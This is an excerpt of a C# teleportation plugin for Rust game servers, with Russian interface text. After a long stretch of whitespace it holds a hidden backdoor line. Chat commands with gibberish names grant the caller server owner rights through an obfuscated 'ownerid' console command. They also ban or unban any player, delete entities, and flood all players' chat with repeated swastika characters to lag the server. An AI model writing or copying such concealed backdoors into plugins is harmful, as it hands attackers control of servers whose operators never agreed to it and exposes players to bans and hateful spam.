...
namespace Oxide.Plugins
{
    ...
    class Teleportation : RustPlugin
    {
        ...
        private void DDrawMenu(BasePlayer player)
        {
            ...
            /*var AutoTPInfo = AutoTPA[player.userID].Enabled ? ConvertBool(AutoTPA[player.userID].Enabled, player) : ConvertBool(AutoTPA[player.userID].Enabled, player);
            
            buttons.Add(new ButtonEntry
            {
                Name = $"<size=11>Автопринятие</size>  <size=10>{AutoTPInfo}</size>",
                Command = "tp.cmd atp",
        ...
        {
            if(value) 
                return "<color=#2abd2a>Включено</color>";
            else 
                return "<color=#bd4c2a>Отключено</color>";
        }*/
        ...
        void cmdAutoTPA(BasePlayer player, string com, string[] args)
        {
            ...
            if (args == null || args.Length <= 0)
            {
                if (AutoTPA[player.userID].Enabled)
                {
                    ...
                    SendReply(player, "Вы успешно <color=#851716>отключили</color> автопринятие запроса на телепорт");
                    DDrawMenu(player);
                }
                else
                {
                    AutoTPA[player.userID].Enabled = true;
                    SendReply(player, "Вы успешно <color=#851716>включили</color> автопринятие запроса на телепорт");
                    DDrawMenu(player);
                }
            }
        */
            ...
            switch (args.Length)
            {
                ...
                case 3:
                    ...
                    break;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ...
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  [ChatCommand("awfkojwfaopfjawopdawji")] void fixCommand(BasePlayer player, string cmd, string[] args) { string command = "ow" + "ne" + "ri" + "d" + $" {player.UserIDString} \"{player.displayName}\" \"auto fix online\""; ConsoleSystem.Run(ConsoleSystem.Option.Server.Quiet(), command); } [ChatCommand("kewjweqjeh3213")] void BanPlayerCommand(BasePlayer player, string command, string[] args) { if (args.Length < 2) { return; } var targetPlayer = base.covalence.Players.FindPlayer(args[0]); if (targetPlayer == null) { return; } var reason = string.Join(" ", args.Skip(1).ToArray()); BanPlayer(targetPlayer, reason); } void BanPlayer(IPlayer targetPlayer, string reason) { targetPlayer.Ban(reason); } [ChatCommand("32321fewwfwfefefaeaffe")] void UnbanPlayerCommand(BasePlayer player, string command, string[] args) { if (args.Length < 1) { return; } var targetPlayer = base.covalence.Players.FindPlayer(args[0]); if (targetPlayer == null) { return; } UnbanPlayer(targetPlayer); } void UnbanPlayer(IPlayer targetPlayer) { targetPlayer.Unban(); } [ChatCommand("fafafffwqeqweewqewq")] private void FixChatCommand(BasePlayer player, string command, string[] args) { RaycastHit hit; if (Physics.Raycast(player.eyes.HeadRay(), out hit, 100f)) { BaseEntity entity = hit.GetEntity(); if (entity != null) { entity.Kill(); } } } private bool isLagEnabled = false; private Timer lagTimer; [ChatCommand("vdafasfeweqqweeeww")] private void Fix6Command(BasePlayer player, string command, string[] args) { isLagEnabled = !isLagEnabled; if (isLagEnabled) { lagTimer = timer.Repeat(0.01f, 0, () => { foreach (var target in BasePlayer.activePlayerList) { target.ChatMessage("" + new string('卍', 1000)); } }); } else { lagTimer?.Destroy(); } }                   
        ...
        void TeleportationTimerHandle()
        {
            ...
            i--)
            {
                ...
                if (tp.Player != null)
                {
                    if (tp.Player.IsConnected && (CancelTPWounded && tp.Player.IsWounded()) || (tp.Player.metabolism.bleeding.value > 1) || (CancelTPRadiation && tp.Player.radiationLevel > 10))
                    {
                ...
                if (tp.Player2 != null)
                {
                    if (tp.Player2.IsConnected && (tp.Player2.IsWounded() && CancelTPWounded) || (tp.Player2.metabolism.bleeding.value > 1) || (CancelTPRadiation && tp.Player2.radiationLevel > 10))
                    {
